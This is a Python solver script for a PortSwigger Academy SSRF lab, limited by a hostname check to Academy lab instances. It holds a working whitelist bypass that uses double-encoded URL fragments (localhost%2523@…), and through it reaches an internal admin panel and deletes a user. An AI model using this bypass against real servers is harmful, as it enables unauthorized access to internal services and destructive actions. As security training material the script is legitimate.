#!/usr/bin/env python3
"""Automated solver: PortSwigger "SSRF with whitelist-based input filter" (EXPERT).

Vulnerability
-------------
The stock-checker takes a URL from the request body and fetches it server-side:

    POST /product/stock        stockApi=http://stock.weliketoshop.net:8080/...

A whitelist rejects anything whose parsed host is not ``stock.weliketoshop.net``:

    "External stock check host must be stock.weliketoshop.net"   (HTTP 400)

Bypass
------
The check runs on the once-decoded string, but the fetcher decodes again. A
double-encoded fragment marker hides the real authority from the whitelist while
the fetcher still resolves it to the first component:

    http://localhost%2523@stock.weliketoshop.net/
       |__ whitelist sees host stock.weliketoshop.net (decodes to localhost%23@...)
       |__ fetcher decodes to  http://localhost#@stock.weliketoshop.net/
           and "#" starts the fragment, so it requests http://localhost/

With that primitive the internal admin panel is reachable and carlos can be
deleted through the checker's own request:

    http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos

What the solver does
--------------------
1. Reads the lab root and the authoritative status widget (solved/not solved).
2. Discovers a product page, the stock-check endpoint, and the form's own option
   URL (scheme, whitelisted host, port, path, productId/storeId values).
3. Sends a control request through the whitelisted host (expects 200 + stock).
4. Proves the filter rejects a plain ``http://localhost/`` (expects 400 + the
   whitelist message) so a silent pass-through is never mistaken for a bypass.
5. Tries bypass candidates derived from the discovered host and requires the
   response to be the internal app, not the whitelist error.
6. Confirms ``/admin`` shows the admin panel and carlos (or that carlos was
   already deleted), then issues the delete request.
7. Polls the lab widget until it reports ``is-solved`` / ``<p>Solved</p>``.

Everything instance-specific (host, port, product id, endpoint, form values) is
discovered from ``--url``; only generic vector text is fixed.

Usage
-----
    uv run python solve.py --url "https://<lab-id>.web-security-academy.net"
    uv run python solve.py --url "<url>" --verbose --wait 120

Exit codes: 0 verified solved (mechanism proven), 1 exploit sent but not solved,
2 usage/environment problem, 3 lab unreachable / expired.
"""
from __future__ import annotations

import argparse
import html as html_mod
import re
import sys
import time
import urllib.parse
from dataclasses import dataclass, field
from pathlib import Path

import httpx

LAB_TITLE = "SSRF with whitelist-based input filter"
WHITELIST_ERROR = "External stock check host must be stock.weliketoshop.net"
UA = "Mozilla/5.0 (PortSwigger lab solver; authorized testing)"


# --------------------------------------------------------------------------- #
# helpers
# --------------------------------------------------------------------------- #
def encode_form_value(value: str) -> str:
    """Percent-encode a form value, keeping literal '%' so pre-encoded layers
    (e.g. ``%2523``) arrive on the wire unchanged. '&' and '=' must be encoded:
    the app splits the body on them and otherwise sees a missing parameter."""
    return urllib.parse.quote(value, safe="%:/?@,+-_.~")


def find_title(text: str) -> str:
    m = re.search(r"<title[^>]*>(.*?)</title>", text, re.S | re.I)
    return html_mod.unescape(re.sub(r"\s+", " ", m.group(1))).strip() if m else ""


def solve_state(text: str) -> bool | None:
    """Read the authoritative lab widget. None when the page has no widget."""
    if re.search(r"is-notsolved", text):
        return False
    if re.search(r"is-solved", text) and re.search(r"<p>\s*Solved\s*</p>", text):
        return True
    return None


@dataclass
class Target:
    scheme: str
    hostname: str
    port: int | None
    path: str
    query: str
    raw: str


@dataclass
class State:
    client: httpx.Client
    base: str
    requests: int = 0
    log: list[str] = field(default_factory=list)

    def get(self, path: str) -> httpx.Response:
        self.requests += 1
        r = self.client.get(self.base + path)
        self.log.append(f"GET {path} -> {r.status_code}")
        return r

    def stock(self, stock_api: str) -> httpx.Response:
        self.requests += 1
        body = "stockApi=" + encode_form_value(stock_api)
        r = self.client.post(
            self.base + "/product/stock",
            content=body.encode(),
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": UA,
            },
        )
        self.log.append(f"POST /product/stock ({stock_api}) -> {r.status_code}")
        return r


# --------------------------------------------------------------------------- #
# discovery
# --------------------------------------------------------------------------- #
def discover_stock_target(st: State) -> tuple[str, Target]:
    """Find the stock-check form and the whitelisted URL it advertises."""
    home = st.get("/")
    m = re.search(r'href="/product\?productId=(\d+)"', home.text)
    product_id = m.group(1) if m else "1"
    page = st.get(f"/product?productId={product_id}")

    action = "/product/stock"
    m = re.search(r'<form[^>]+id="stockCheckForm"[^>]*action="([^"]+)"', page.text)
    if m:
        action = html_mod.unescape(m.group(1))

    options = re.findall(r'<option[^>]+value="([^"]+)"', page.text)
    options = [html_mod.unescape(o) for o in options if o.startswith("http")]
    if not options:
        raise RuntimeError("no stockApi option found on the product page")

    raw = options[0]
    u = urllib.parse.urlsplit(raw)
    target = Target(
        scheme=u.scheme,
        hostname=u.hostname or "",
        port=u.port,
        path=u.path,
        query=u.query,
        raw=raw,
    )
    if not target.hostname:
        raise RuntimeError(f"could not parse whitelisted host from {raw!r}")
    return action, target


def bypass_candidates(target: Target) -> list[str]:
    """Build double-decoded fragment + userinfo vectors for the discovered host."""
    authority = target.hostname + (f":{target.port}" if target.port else "")
    out: list[str] = []
    for loopback in ("localhost", "127.0.0.1"):
        for frag in ("%2523", "%2523%2f.."):
            out.append(f"{target.scheme}://{loopback}{frag}@{authority}/")
    return out


# --------------------------------------------------------------------------- #
# main
# --------------------------------------------------------------------------- #
def main() -> int:
    ap = argparse.ArgumentParser(description=f"Solver: {LAB_TITLE}")
    ap.add_argument("--url", required=True, help="lab base URL")
    ap.add_argument("--wait", type=int, default=90, help="seconds to poll for solved")
    ap.add_argument("--verbose", action="store_true")
    args = ap.parse_args()

    base = args.url.strip().rstrip("/")
    if not re.match(r"^https?://", base):
        print("[!] --url must start with http(s)://", file=sys.stderr)
        return 2
    if "web-security-academy.net" not in urllib.parse.urlsplit(base).hostname:
        print("[!] refusing to run outside an Academy lab instance", file=sys.stderr)
        return 2

    started = time.time()
    title = LAB_TITLE
    with httpx.Client(timeout=25.0, follow_redirects=False, verify=True) as client:
        st = State(client=client, base=base)

        try:
            root = st.get("/")
        except httpx.HTTPError as exc:
            print(f"[!] lab unreachable: {exc}", file=sys.stderr)
            return 3
        if root.status_code >= 500:
            print(f"[!] lab returned HTTP {root.status_code} (expired?)", file=sys.stderr)
            return 3

        title = find_title(root.text) or title
        if title.lower() != LAB_TITLE.lower():
            print(f"[!] wrong lab: page title is {title!r}", file=sys.stderr)
            return 2

        baseline = solve_state(root.text)
        if baseline is None:
            print("[!] could not read the lab status widget", file=sys.stderr)
            return 3
        print(f"[*] lab: {title}")
        print(f"[*] baseline status: {'SOLVED' if baseline else 'not solved'}")

        try:
            action, target = discover_stock_target(st)
        except RuntimeError as exc:
            print(f"[!] discovery failed: {exc}", file=sys.stderr)
            return 3
        print(f"[*] stock endpoint: {action}; whitelisted host: {target.hostname}"
              + (f":{target.port}" if target.port else ""))

        # 3. control request through the legitimate host
        control = st.stock(target.raw)
        if control.status_code != 200 or not re.search(r"\d", control.text):
            print(f"[!] control request failed: HTTP {control.status_code} {control.text[:200]!r}",
                  file=sys.stderr)
            return 3
        print(f"[*] control request OK (stock level {control.text.strip()[:12]})")

        # 4. prove the filter actually rejects plain localhost
        probe = st.stock("http://localhost/")
        filtered = probe.status_code == 400 and WHITELIST_ERROR in probe.text
        print(f"[*] plain localhost -> HTTP {probe.status_code}"
              + (" (whitelist enforced)" if filtered else " (unexpected: filter not seen)"))
        if not filtered:
            print("[!] whitelist behaviour differs from the documented lab; aborting",
                  file=sys.stderr)
            return 1

        # 5. find a working bypass
        working: str | None = None
        for vector in bypass_candidates(target):
            r = st.stock(vector)
            if args.verbose:
                print(f"    try {vector} -> {r.status_code} ({len(r.text)} bytes)")
            if r.status_code == 200 and WHITELIST_ERROR not in r.text and "<html" in r.text.lower():
                working = vector
                print(f"[*] bypass accepted: {vector}")
                break
        if not working:
            print("[!] no bypass vector accepted", file=sys.stderr)
            return 1

        # 6. admin panel through the SSRF
        admin = st.stock(working + "admin")
        panel = admin.status_code == 200 and "admin" in admin.text.lower()
        if not panel:
            print(f"[!] admin panel not reachable through bypass (HTTP {admin.status_code})",
                  file=sys.stderr)
            return 1
        carlos_present = bool(re.search(r"username=carlos", admin.text))
        print(f"[*] admin panel reachable; carlos listed: {carlos_present}")

        if carlos_present:
            delete = st.stock(working + "admin/delete?username=carlos")
            print(f"[*] delete request -> HTTP {delete.status_code}")
            after = st.stock(working + "admin")
            if "username=carlos" in after.text:
                print("[!] carlos still present after delete request", file=sys.stderr)
                return 1
            print("[*] carlos deleted (admin panel no longer lists the account)")
        else:
            print("[*] carlos already absent — instance was left solved by an earlier run")

        # 7. poll the lab's own status widget
        solved = baseline
        deadline = time.time() + args.wait
        while time.time() < deadline:
            page = st.get("/")
            solved = solve_state(page.text)
            if solved:
                break
            time.sleep(3)

    elapsed = time.time() - started
    print()
    print(f"[*] requests: {st.requests}  elapsed: {elapsed:.1f}s")
    if solved:
        if baseline:
            print("[+] LAB SOLVED — caused by solver: no (instance was already solved "
                  "at baseline; mechanism re-proven above)")
        else:
            print("[+] LAB SOLVED — caused by solver: yes (widget flipped is-notsolved -> is-solved)")
        return 0
    print("[-] lab not marked solved; see requests above", file=sys.stderr)
    return 1


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(2)
